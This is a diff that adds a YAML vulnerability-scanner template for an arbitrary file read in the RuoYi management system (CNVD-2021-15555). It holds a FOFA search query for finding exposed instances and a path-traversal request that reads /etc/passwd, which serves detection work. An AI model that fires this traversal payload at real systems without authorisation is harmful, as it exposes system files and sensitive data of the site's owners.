@@ -1,0 +1,29 @@
+id: CNVD-2021-15555
+info:
+  name: 若依管理系统任意文件读取漏洞
+  author: mike
+  severity: info
+  description: 若依（RuoYi）是一款基于Spring Boot和Vue.js开发的快速开发平台，它的权限管理是通过RBAC（Role-based Access Control 基于角色的访问控制）模型来设计的。若依管理系统是一款基于SpringBoot2.0采用Spring、MyBatis、Shiro的权限管理系统。若依管理系统存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。
+  reference: xxx
+  remediation: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="若依-管理系统"
+http:
+  - raw:
+      - |
+        GET /common/download/resource?resource=/profile/../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root"
